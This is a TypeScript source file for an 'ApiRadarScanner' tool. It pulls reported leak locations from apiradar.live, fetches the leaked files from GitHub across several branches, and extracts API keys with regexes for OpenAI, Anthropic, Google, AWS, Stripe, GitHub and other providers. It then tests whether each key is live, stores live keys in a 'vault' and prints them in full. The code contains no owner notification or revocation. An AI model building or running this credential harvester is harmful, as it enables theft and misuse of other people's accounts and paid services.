import axios from "axios";
import { createSubsystemLogger } from "../logging/subsystem.js";
import { SecretValidator, ValidationResult } from "./secret_validator.js";
import { VectorMemoryManager } from "../memory/vector-engine.js";

const log = createSubsystemLogger("tools/apiradar");

export interface ApiRadarLeak {
    id: string;
    provider: string;
    redactedKey: string;
    repoUrl: string;
    filePath: string;
    leakDetectedAt: string;
}

export interface HuntResult {
    provider: string;
    key: string;
    type: string;
    source: string;
    repoUrl: string;
    isLive: boolean;
    details: string;
}

export class ApiRadarScanner {
    private validator: SecretValidator;
    private branches = ["main", "master", "dev", "prod", "develop", "staging", "v1"];
    private timeout = 10000;

    constructor(private memory?: VectorMemoryManager) {
        this.validator = new SecretValidator();
    }

    /**
     * Fetch recent leaks from ApiRadar
     */
    async fetchRecentLeaks(provider: string = "all"): Promise<ApiRadarLeak[]> {
        log.info(`Fetching recent leaks from ApiRadar.live for provider: ${provider}`);
        try {
            const url = provider === "all"
                ? "https://apiradar.live/api/leaks"
                : `https://apiradar.live/api/leaks?provider=${provider}&limit=10`;

            const response = await axios.get<{ leaks: ApiRadarLeak[] }>(url, {
                headers: { "Accept": "application/json" }
            });
            return response.data.leaks || [];
        } catch (error) {
            log.error(`Failed to fetch leaks for ${provider}: ${error}`);
            return [];
        }
    }

    /**
     * Attempt to fetch raw content from a GitHub repo across multiple common branches
     */
    private async fetchRawContent(repoPath: string, filePath: string): Promise<string | null> {
        for (const branch of this.branches) {
            const url = `https://raw.githubusercontent.com/${repoPath}/${branch}/${filePath}`;
            try {
                const response = await axios.get<string>(url, { timeout: 5000, responseType: 'text' });
                if (response.status === 200) {
                    log.info(`Found raw content on branch: ${branch}`);
                    return response.data;
                }
            } catch (e) {
                // Continue to next branch
            }
        }
        return null;
    }

    /**
     * Extract potential API keys using expanded regex patterns
     */
    private extractKeys(content: string): { key: string, type: string }[] {
        const patterns: { type: string, regex: RegExp }[] = [
            { type: "anthropic_api_key", regex: /sk-ant-[a-zA-Z0-9\-_]{20,}/g },
            { type: "openai_key", regex: /sk-proj-[a-zA-Z0-9\-_]{20,}|sk-[a-zA-Z0-9]{40,}/g },
            { type: "gemini_api_key", regex: /AIzaSy[a-zA-Z0-9\-_]{33}/g },
            { type: "google_api_key", regex: /AIza[0-9A-Za-z\-_]{35}/g },
            { type: "stripe_key", regex: /(?:sk|pk)_(?:live|test)_[0-9a-zA-Z]{24,}/g },
            { type: "slack_token", regex: /xox[baprs]-[0-9a-zA-Z]{10,48}/g },
            { type: "github_token", regex: /gh[pous]_[a-zA-Z0-9]{36,}/g },
            { type: "aws_access_key", regex: /AKIA[0-9A-Z]{16}/g },
            { type: "groq_key", regex: /gsk_[a-zA-Z0-9]{48,}/g },
            { type: "openrouter_key", regex: /sk-or-v1-[a-zA-Z0-9]{64}/g },
            { type: "xai_key", regex: /xai-[a-zA-Z0-9]{45,}/g },
            { type: "cerebras_key", regex: /csk-[a-zA-Z0-9]{40,}/g }
        ];

        const results: { key: string, type: string }[] = [];
        for (const pattern of patterns) {
            const matches = content.match(pattern.regex);
            if (matches) {
                for (const key of matches) {
                    results.push({ key, type: pattern.type });
                }
            }
        }
        return results;
    }

    /**
     * Perform a full hunt: fetch leaks, scrape source, and validate keys
     */
    async performHunt(onProgress?: (msg: string) => void): Promise<HuntResult[]> {
        const providers = ["openai", "anthropic", "google", "openrouter", "xai", "groq", "cerebras"];
        const finalResults: HuntResult[] = [];

        onProgress?.(`🛰️ **Targeting all ${providers.length} intelligence providers...**\n\n`);

        for (const provider of providers) {
            onProgress?.(`📡 **Scanning Provider:** \`${provider.toUpperCase()}\` ...\n`);
            const leaks = await this.fetchRecentLeaks(provider);

            if (leaks.length === 0) {
                onProgress?.(`  ℹ️ No fresh vectors found for ${provider}.\n`);
                continue;
            }

            for (const leak of leaks) {
                const repoPath = leak.repoUrl.replace("https://github.com/", "");
                onProgress?.(`🔍 Analyzing \`${repoPath}/${leak.filePath}\` ...\n`);

                const content = await this.fetchRawContent(repoPath, leak.filePath);
                if (!content) {
                    onProgress?.(`  ⚠️ Source unreachable.\n`);
                    continue;
                }

                const foundTokens = this.extractKeys(content);
                if (foundTokens.length === 0) {
                    onProgress?.(`  ✅ No raw patterns found.\n`);
                    continue;
                }

                for (const { key, type } of foundTokens) {
                    const redacted = `${key.substring(0, 8)}...${key.substring(key.length - 4)}`;
                    onProgress?.(`  ⚡ **Token Identified:** \`${type}\` (${redacted})\n  📡 Validating... `);

                    try {
                        const validation = await this.validator.validate(type, key);
                        if (validation.is_live) {
                            onProgress?.(`✅ **LIVE!** (${validation.details})\n`);
                            // Auto-Vault the live key
                            if (this.memory) {
                                await this.memory.vaultKey(type, key, {
                                    source: leak.filePath,
                                    repoUrl: leak.repoUrl,
                                    details: validation.details
                                });
                            }
                        } else {
                            onProgress?.(`❌ Rejected: ${validation.details}\n`);
                        }

                        finalResults.push({
                            provider,
                            key,
                            type,
                            source: leak.filePath,
                            repoUrl: leak.repoUrl,
                            isLive: validation.is_live,
                            details: validation.details
                        });

                        // Notify in real-time if a live key is found
                        if (validation.is_live && onProgress) {
                            onProgress(`🎉 **CRITICAL FINDING:** Discovered live \`${type}\` in \`${repoPath}\`!\n`);
                            onProgress(`🔑 **KEY:** \`${key}\` (${validation.details})\n\n`);
                        }
                    } catch (err: any) {
                        onProgress?.(`⚠️ Test Fault: ${err.message}\n`);
                    }
                }
            }
        }

        return finalResults;
    }
}
